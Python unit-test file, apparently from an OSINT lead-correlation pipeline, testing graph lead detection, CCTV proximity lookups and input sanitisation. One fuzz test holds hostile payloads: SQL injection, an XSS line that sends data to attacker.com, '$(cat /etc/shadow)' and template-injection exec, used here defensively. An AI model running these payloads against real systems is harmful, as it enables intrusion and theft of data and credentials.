"""
========================================================================================
     24/7 CONTINUOUS AUTONOMOUS FORENSIC CORRELATION & LEAD MATCHING PIPELINE
               ADVERSARIAL EMPIRICAL CHALLENGER & STRESS HARNESS
========================================================================================
Empirical Challenger: Independent verification suite stress-testing graph cycles,
degenerate nodes, 288 Caltrans CCTV coordinate boundaries, extreme geodesics,
and malformed/malicious input payloads.
Target: C:\\OsintNeoAi\\tests\\test_adversarial_empirical_challenge.py
========================================================================================
"""

import os
import sys
import json
import math
import time
import unittest
from pathlib import Path
from collections import defaultdict, Counter

# Dynamic repo root resolution
REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

# Safe route registration shim for Flask
try:
    import flask
    import flask.sansio.app
    _orig_add_url_rule = flask.sansio.app.App.add_url_rule
    def _safe_add_url_rule(self, rule, endpoint=None, view_func=None, **options):
        ep = endpoint or (view_func.__name__ if view_func else None)
        if ep and ep in self.view_functions:
            ep = f"{ep}_{len(self.view_functions)}"
        return _orig_add_url_rule(self, rule, endpoint=ep, view_func=view_func, **options)
    flask.sansio.app.App.add_url_rule = _safe_add_url_rule
except Exception:
    pass

from api.app import app
from api.osint_pipeline.normalizers import (
    normalize_entity_name,
    normalize_apn,
    normalize_address,
    normalize_timestamp,
    normalize_lead_payload,
)
from scripts.calculate_cctv_proximity import (
    haversine_miles,
    load_cctv_cameras,
    get_nearest_cctv,
    TARGETS,
)


def run_adversarial_graph_traversal(nodes, edges):
    """
    Parametric graph correlation traversal harness for stress testing cycles,
    isolated nodes, and degenerate structures.
    """
    nm = {}
    for n in nodes:
        if isinstance(n, dict):
            nid = n.get("id") or n.get("_id")
            if nid:
                nm[nid] = n

    def nd(edge, side):
        sid = edge.get(f"{side}_id") or edge.get(side)
        if isinstance(sid, dict):
            sid = sid.get("id")
        return nm.get(sid) if sid else None

    def ntype(n):
        if not isinstance(n, dict):
            return ""
        return n.get("type") or n.get("label") or ""

    def nprops(n):
        return n.get("properties", {}) if isinstance(n.get("properties"), dict) else n

    leads = []

    # Vector 1: PPP + Property Overlap
    ppp_orgs = set()
    prop_orgs = set()
    for e in edges:
        if not isinstance(e, dict):
            continue
        et = e.get("type") or e.get("label", "")
        s = nd(e, "source")
        t = nd(e, "target")
        if et == "RECEIVED_PPP" and s and ntype(s) == "ORGANIZATION":
            sid = e.get("source_id") or e.get("source")
            if isinstance(sid, dict):
                sid = sid.get("id")
            if sid:
                ppp_orgs.add(sid)
        if et == "OWNS" and t and ntype(t) == "PROPERTY":
            sid = e.get("source_id") or e.get("source")
            if isinstance(sid, dict):
                sid = sid.get("id")
            if sid:
                prop_orgs.add(sid)

    overlap = ppp_orgs & prop_orgs
    for oid in sorted(list(overlap)):
        n = nm.get(oid, {})
        p = nprops(n)
        leads.append({
            "vector": "PPP_PROPERTY_OVERLAP",
            "severity": "CRITICAL",
            "entity_id": oid,
            "entity_name": p.get("name", str(oid)),
        })

    # Vector 2: Multi-Org Persons
    po = defaultdict(set)
    for e in edges:
        if not isinstance(e, dict):
            continue
        if e.get("type") in ("OFFICER_OF", "OWNS", "DIRECTOR_OF", "MEMBER_OF"):
            s = nd(e, "source")
            t = nd(e, "target")
            if s and t and ntype(s) == "PERSON" and ntype(t) == "ORGANIZATION":
                sid = e.get("source_id") or e.get("source")
                tid = e.get("target_id") or e.get("target")
                if isinstance(sid, dict):
                    sid = sid.get("id")
                if isinstance(tid, dict):
                    tid = tid.get("id")
                if sid and tid:
                    po[sid].add(tid)

    for pid, org_set in po.items():
        if len(org_set) >= 4:
            n = nm.get(pid, {})
            leads.append({
                "vector": "MULTI_ORG_PERSON",
                "severity": "HIGH",
                "person_id": pid,
                "org_count": len(org_set),
            })

    # Vector 3: Same-Address Shell Clusters
    addr_orgs = defaultdict(set)
    for e in edges:
        if not isinstance(e, dict):
            continue
        if e.get("type") == "REGISTERED_AT":
            s = nd(e, "source")
            t = nd(e, "target")
            if s and t and ntype(s) == "ORGANIZATION" and ntype(t) == "ADDRESS":
                sid = e.get("source_id") or e.get("source")
                tid = e.get("target_id") or e.get("target")
                if isinstance(sid, dict):
                    sid = sid.get("id")
                if isinstance(tid, dict):
                    tid = tid.get("id")
                if sid and tid:
                    addr_orgs[tid].add(sid)

    for aid, org_set in addr_orgs.items():
        if len(org_set) >= 5:
            leads.append({
                "vector": "ADDRESS_SHELL_CLUSTER",
                "severity": "CRITICAL",
                "address_id": aid,
                "org_count": len(org_set),
            })

    # Vector 5: Litigation Degree
    lit_degrees = Counter()
    for e in edges:
        if not isinstance(e, dict):
            continue
        if e.get("type") == "LITIGANT_IN":
            s = nd(e, "source")
            t = nd(e, "target")
            if s and t and ntype(s) == "PERSON" and ntype(t) == "LAWSUIT":
                sid = e.get("source_id") or e.get("source")
                if isinstance(sid, dict):
                    sid = sid.get("id")
                if sid:
                    lit_degrees[sid] += 1

    for pid, deg in lit_degrees.items():
        if deg >= 2:
            leads.append({
                "vector": "LITIGATION_EXPOSURE",
                "severity": "MEDIUM",
                "person_id": pid,
                "connections": deg,
            })

    return {"leads": leads, "nodes_count": len(nodes), "edges_count": len(edges)}


class TestAdversarialEmpiricalChallenge(unittest.TestCase):
    """
    Adversarial stress-testing suite directly validating:
    1. Graph cycle termination & degeneracy
    2. Isolated node filtering
    3. 288 Caltrans CCTV coordinate calculations & spatial bounds
    4. Extreme/polar/antipodal geocoordinates
    5. Malformed & malicious payload sanitization
    """

    def setUp(self):
        self.app = app
        self.app.config["TESTING"] = True
        self.client = self.app.test_client()

    # ==================================================================================
    # 1. GRAPH CYCLE TERMINATION & DEGENERACY
    # ==================================================================================

    def test_adv_graph_deep_100_node_cycle_termination(self):
        """Stress: 100-node circular directed cycle A_0 -> A_1 -> ... -> A_99 -> A_0."""
        nodes = [{"id": f"NODE_{i}", "type": "ORGANIZATION", "name": f"Org {i}"} for i in range(100)]
        edges = [{"source_id": f"NODE_{i}", "target_id": f"NODE_{(i+1)%100}", "type": "AFFILIATE_OF"} for i in range(100)]

        start_time = time.time()
        res = run_adversarial_graph_traversal(nodes, edges)
        elapsed = time.time() - start_time

        self.assertLess(elapsed, 0.1, "100-node cycle traversal must execute in < 100ms")
        self.assertEqual(len(res["leads"]), 0, "Non-vector cycle edges must not produce false leads")
        self.assertEqual(res["nodes_count"], 100)
        self.assertEqual(res["edges_count"], 100)

    def test_adv_graph_dense_clique_with_self_loops(self):
        """Stress: Fully-connected K_15 graph with self-loops on every node."""
        k = 15
        nodes = [{"id": f"CLIQUE_{i}", "type": "PERSON", "name": f"Person {i}"} for i in range(k)]
        edges = []
        for i in range(k):
            edges.append({"source_id": f"CLIQUE_{i}", "target_id": f"CLIQUE_{i}", "type": "SELF_REF"})
            for j in range(k):
                if i != j:
                    edges.append({"source_id": f"CLIQUE_{i}", "target_id": f"CLIQUE_{j}", "type": "KNOWS"})

        start_time = time.time()
        res = run_adversarial_graph_traversal(nodes, edges)
        elapsed = time.time() - start_time

        self.assertLess(elapsed, 0.1, "K_15 dense clique must process in < 100ms")
        self.assertEqual(len(res["leads"]), 0)
        self.assertEqual(res["edges_count"], k * k)

    def test_adv_graph_interlocking_multi_vector_cycles(self):
        """Stress: Multiple intersecting cycles between Persons, Orgs, Properties, and Lawsuits."""
        nodes = [
            {"id": "P1", "type": "PERSON", "name": "Actor 1"},
            {"id": "P2", "type": "PERSON", "name": "Actor 2"},
            {"id": "ORG1", "type": "ORGANIZATION", "name": "Corp 1"},
            {"id": "ORG2", "type": "ORGANIZATION", "name": "Corp 2"},
            {"id": "PROP1", "type": "PROPERTY", "name": "Real Estate 1"},
            {"id": "CASE1", "type": "LAWSUIT", "name": "Litigation 1"},
            {"id": "CASE2", "type": "LAWSUIT", "name": "Litigation 2"},
        ]
        # Create circular links: P1 -> ORG1 -> PROP1 -> P1, and P1 -> CASE1, CASE2
        edges = [
            {"source_id": "P1", "target_id": "ORG1", "type": "OFFICER_OF"},
            {"source_id": "ORG1", "target_id": "PROP1", "type": "OWNS"},
            {"source_id": "ORG1", "target_id": "ORG1", "type": "RECEIVED_PPP"},
            {"source_id": "P1", "target_id": "CASE1", "type": "LITIGANT_IN"},
            {"source_id": "P1", "target_id": "CASE2", "type": "LITIGANT_IN"},
            {"source_id": "P2", "target_id": "P1", "type": "ASSOCIATE_OF"},
        ]
        res = run_adversarial_graph_traversal(nodes, edges)
        lead_vectors = {l["vector"] for l in res["leads"]}
        self.assertIn("PPP_PROPERTY_OVERLAP", lead_vectors)
        self.assertIn("LITIGATION_EXPOSURE", lead_vectors)

    # ==================================================================================
    # 2. ISOLATED NODE FILTERING & DEGENERACY
    # ==================================================================================

    def test_adv_graph_5000_isolated_nodes_zero_false_positives(self):
        """Stress: 5,000 isolated nodes of heterogeneous types must produce exactly 0 false leads."""
        types = ["ORGANIZATION", "PERSON", "PROPERTY", "ADDRESS", "LAWSUIT", "VEHICLE"]
        nodes = [{"id": f"ISO_{i}", "type": types[i % len(types)], "name": f"Entity {i}"} for i in range(5000)]
        edges = []

        start_time = time.time()
        res = run_adversarial_graph_traversal(nodes, edges)
        elapsed = time.time() - start_time

        self.assertLess(elapsed, 0.2, "5,000 isolated nodes must process in < 200ms")
        self.assertEqual(len(res["leads"]), 0, "Isolated nodes must produce 0 leads")
        self.assertEqual(res["nodes_count"], 5000)

    def test_adv_graph_dangling_and_corrupted_edges(self):
        """Stress: Edges pointing to missing nodes, null IDs, or malformed dict keys."""
        nodes = [{"id": "EXISTING_1", "type": "ORGANIZATION", "name": "Valid Org"}]
        edges = [
            {"source_id": "MISSING_SRC", "target_id": "MISSING_TGT", "type": "OWNS"},
            {"source_id": None, "target_id": "EXISTING_1", "type": "OWNS"},
            {"source_id": "EXISTING_1", "target_id": None, "type": "RECEIVED_PPP"},
            {"source": {"id": "NESTED_MISSING"}, "target": "EXISTING_1", "type": "OFFICER_OF"},
            {"invalid_key": 12345},
            "not even a dict",
            None,
        ]
        res = run_adversarial_graph_traversal(nodes, edges)
        self.assertEqual(len(res["leads"]), 0)

    # ==================================================================================
    # 3. 288 CALTRANS CCTV COORDINATE CALCULATIONS & SPATIAL RADAR
    # ==================================================================================

    def test_adv_cctv_288_cameras_full_integrity_and_bounding_box(self):
        """Verify all 288 Caltrans District 12 cameras are valid and within OC geographic bounds."""
        cameras = load_cctv_cameras()
        self.assertEqual(len(cameras), 288, "Must load exactly 288 Caltrans District 12 cameras")

        for idx, cam in enumerate(cameras):
            self.assertTrue(cam["id"], f"Camera at index {idx} has missing ID")
            self.assertTrue(cam["location"], f"Camera {cam['id']} has missing location")
            lat, lon = cam["lat"], cam["lon"]
            self.assertIsInstance(lat, float)
            self.assertIsInstance(lon, float)
            # Orange County / District 12 Caltrans Bounding Box: Lat [33.3, 34.1], Lon [-118.2, -117.4]
            self.assertGreaterEqual(lat, 33.3, f"Camera {cam['id']} lat {lat} out of bounds")
            self.assertLessEqual(lat, 34.1, f"Camera {cam['id']} lat {lat} out of bounds")
            self.assertGreaterEqual(lon, -118.2, f"Camera {cam['id']} lon {lon} out of bounds")
            self.assertLessEqual(lon, -117.4, f"Camera {cam['id']} lon {lon} out of bounds")

            # Validate video stream or snapshot URL presence
            stream = cam.get("stream_url") or ""
            img = cam.get("image_url") or ""
            self.assertTrue(stream.startswith("http") or img.startswith("http"), f"Camera {cam['id']} missing valid HTTP url")

    def test_adv_cctv_nearest_ranking_monotonicity_across_multiple_probes(self):
        """Stress: Verify nearest CCTV camera distance ranking is strictly monotonic (non-decreasing)."""
        probe_coords = [
            (33.6558, -117.8682),  # Newport Beach
            (33.7028, -117.9944),  # Huntington Beach
            (33.7389, -118.0016),  # HB Commercial
            (33.8366, -117.9143),  # Anaheim Angel Stadium
            (33.7455, -117.8677),  # Santa Ana Civic Center
            (33.6846, -117.8265),  # Irvine Spectrum
            (33.4255, -117.6111),  # San Clemente (South OC Border)
            (33.9172, -117.8889),  # Brea (North OC Border)
        ]
        cameras = load_cctv_cameras()
        for lat, lon in probe_coords:
            nearest = get_nearest_cctv(lat, lon, k=6, cameras=cameras)
            self.assertEqual(len(nearest), 6)
            distances = [c["distance_miles"] for c in nearest]
            for i in range(len(distances) - 1):
                self.assertLessEqual(distances[i], distances[i+1], f"Distance ranking not monotonic for ({lat}, {lon})")

    # ==================================================================================
    # 4. EXTREME / POLAR / DEGENERATE COORDINATES
    # ==================================================================================

    def test_adv_geodesic_extreme_and_polar_coordinates(self):
        """Stress: Haversine distance under extreme polar, null island, and boundary points."""
        # 1. Null Island (0,0) to Null Island (0,0)
        d_null = haversine_miles(0.0, 0.0, 0.0, 0.0)
        self.assertEqual(d_null, 0.0)

        # 2. North Pole (90, 0) to South Pole (-90, 0) -> Half Earth circumference (~12,437 miles)
        d_poles = haversine_miles(90.0, 0.0, -90.0, 0.0)
        expected_half_circ = math.pi * 3958.8  # ~12,436.81 miles
        self.assertAlmostEqual(d_poles, expected_half_circ, delta=5.0)

        # 3. Equator date line: (0, 180) to (0, -180) -> Same meridian / zero distance
        d_dateline = haversine_miles(0.0, 180.0, 0.0, -180.0)
        self.assertAlmostEqual(d_dateline, 0.0, delta=0.01)

        # 4. Out of bounds latitudes (+/-95 deg) clamped/safe without crash
        d_oob = haversine_miles(95.0, 0.0, -95.0, 0.0)
        self.assertTrue(0.0 <= d_oob <= 15000.0)

        # 5. Non-numeric / NaN / None coordinates return fallback distance 9999.0
        self.assertEqual(haversine_miles(None, None, 33.7, -117.9), 9999.0)
        self.assertEqual(haversine_miles("bad", "coords", 33.7, -117.9), 9999.0)

    # ==================================================================================
    # 5. MALFORMED & MALICIOUS INPUT PAYLOADS
    # ==================================================================================

    def test_adv_payload_fuzzing_sql_xss_command_injection(self):
        """Stress: Fuzz /api/submit-victim and normalizers with SQLi, XSS, and command injections."""
        hostile_inputs = [
            "'; DROP TABLE leads; DROP TABLE users; --",
            "1' OR '1'='1' UNION SELECT username, password FROM users --",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=\"fetch('http://attacker.com?leak='+document.domain)\">",
            "$(cat /etc/shadow)",
            "| calc.exe & ping -n 5 127.0.0.1",
            "../../../../../../windows/system32/cmd.exe",
            "{{7*7}} ${T(java.lang.Runtime).getRuntime().exec('id')}",
            "\x00\x00\x00\x00",
        ]
        for hostile in hostile_inputs:
            # 1. Test normalizers
            norm_name = normalize_entity_name(hostile)
            norm_apn = normalize_apn(hostile)
            norm_addr = normalize_address(hostile)
            self.assertIsInstance(norm_name, str)
            self.assertIsInstance(norm_apn, str)
            self.assertIsInstance(norm_addr, str)

            # 2. Test API ingestion
            payload = {
                "victim_name": hostile,
                "contact_info": hostile,
                "incident_type": hostile,
                "location": hostile,
                "apn": hostile,
                "summary": hostile,
            }
            res = self.client.post("/api/submit-victim", data=json.dumps(payload), content_type="application/json")
            self.assertEqual(res.status_code, 200)
            data = res.get_json()
            self.assertEqual(data.get("status"), "SUCCESS")

    def test_adv_payload_unicode_and_zero_width_characters(self):
        """Stress: Fuzz with zero-width spaces, RTL override marks, and multi-byte emojis."""
        unicode_corpus = [
            "Stewart\u200BIndustries\u200CLLC",  # Zero-width joiners
            "\u202Ereversed_name_attack\u202C",  # RTL override
            "🔥🚨🕵️‍♀️💥🏴‍☠️",  # Emojis
            "Тodd Аment",  # Cyrillic homoglyphs
            "\uFEFF1601 Dove Street",  # Byte Order Mark (BOM)
        ]
        for raw in unicode_corpus:
            norm_name = normalize_entity_name(raw)
            self.assertIsInstance(norm_name, str)
            norm_addr = normalize_address(raw)
            self.assertIsInstance(norm_addr, str)

    def test_adv_payload_oversized_string_and_type_mismatches(self):
        """Stress: 1MB oversized string and heterogeneous python type mismatches."""
        # 1. 1MB string
        huge_str = "CORRUPT_ENTITY_" * 70000
        norm_huge = normalize_entity_name(huge_str)
        self.assertIsInstance(norm_huge, str)

        # 2. Type mismatch inputs
        bad_types = [12345, 99.99, True, False, ["list", "val"], {"dict": "val"}, None]
        for bt in bad_types:
            norm_name = normalize_entity_name(bt)
            norm_apn = normalize_apn(bt)
            norm_addr = normalize_address(bt)
            norm_ts = normalize_timestamp(bt)
            self.assertIsInstance(norm_name, str)
            self.assertIsInstance(norm_apn, str)
            self.assertIsInstance(norm_addr, str)
            self.assertIsInstance(norm_ts, str)
            self.assertIn("T", norm_ts)


if __name__ == "__main__":
    unittest.main(verbosity=2)
